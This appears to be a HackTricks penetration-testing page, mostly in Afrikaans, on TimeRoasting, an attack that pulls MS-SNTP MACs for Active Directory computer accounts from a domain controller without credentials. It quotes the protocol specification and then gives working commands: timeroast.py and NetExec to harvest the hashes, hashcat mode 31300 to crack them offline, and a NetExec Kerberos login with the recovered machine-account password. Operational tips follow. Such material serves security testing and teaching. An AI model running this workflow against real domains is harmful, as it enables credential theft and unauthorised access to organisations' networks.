# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting misbruik die legacy MS-SNTP-authentiseringsuitbreiding. In MS-SNTP kan 'n kliënt 'n 68-byte aanvraag stuur wat enige computeraccount RID insluit; die domain controller gebruik die computeraccount se NTLM-hash (MD4) as sleutel om 'n MAC oor die antwoord te bereken en stuur dit terug. Aanstekers kan hierdie MS-SNTP MACs ongemagtig versamel en dit offline kraak (Hashcat mode 31300) om computeraccount-wagwoorde te herstel.

Sien afdeling 3.1.5.1 "Authentication Request Behavior" en 4 "Protocol Examples" in die amptelike MS-SNTP-spesifikasie vir besonderhede.
![](../../images/Pasted%20image%2020250709114508.png)
Wanneer die ExtendedAuthenticatorSupported ADM element false is, stuur die kliënt 'n 68-byte aanvraag en sluit die RID in die minst beduidende 31 bits van die Key Identifier subfield van die authenticator in.

> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

From section 4 (Protocol Examples):

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

Die crypto-checksum is MD5-gebaseer (sien 3.2.5.1.1) en kan offline gekraak word, wat die roasting attack moontlik maak.

## Hoe om aan te val

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting-skripte deur Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
## Praktiese aanval (unauth) with NetExec + Hashcat

- NetExec kan, unauthenticated, MS-SNTP MACs vir computer RIDs enumereer en versamel en $sntp-ms$ hashes druk wat gereed is vir cracking:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline met Hashcat mode 31300 (MS-SNTP MAC):
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Die herstelde cleartext ooreenstem met 'n rekenaarkonto-wagwoord. Probeer dit direk as die masjienrekening met Kerberos (-k) wanneer NTLM gedeaktiveer is:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Operasionele wenke
- Verseker akkurate tydsinchronisering voor Kerberos: `sudo ntpdate <dc_fqdn>`
- Indien nodig, genereer krb5.conf vir die AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Kaarteer RIDs na principals later via LDAP/BloodHound sodra jy enige authenticated foothold het.

## Verwysings

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
